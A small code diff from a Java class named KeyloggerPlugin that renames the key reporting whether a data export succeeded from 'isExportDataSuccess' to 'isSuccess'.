@@ -101,7 +101,7 @@ public class KeyloggerPlugin extends Plugin{
         boolean isSuccess = dataViewer.exportData();
 
         JSObject data = new JSObject();
-        data.put("isExportDataSuccess",isSuccess);
+        data.put("isSuccess",isSuccess);
 
         call.resolve(data);
 
